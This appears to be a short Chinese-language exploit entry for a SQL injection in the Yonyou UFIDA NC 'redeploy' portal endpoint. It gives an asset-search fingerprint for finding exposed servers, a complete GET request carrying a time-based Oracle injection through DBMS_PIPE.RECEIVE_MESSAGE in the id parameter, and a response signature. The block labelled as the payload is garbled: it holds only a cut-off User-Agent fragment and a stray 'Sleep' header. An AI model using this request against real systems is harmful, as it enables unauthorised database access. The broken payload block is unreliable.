# 用友-UFIDA-NCredeploy存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/M0dUlE/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,2)--&pageId=login HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Sleep: sleep
```
- **响应特征**：200 Error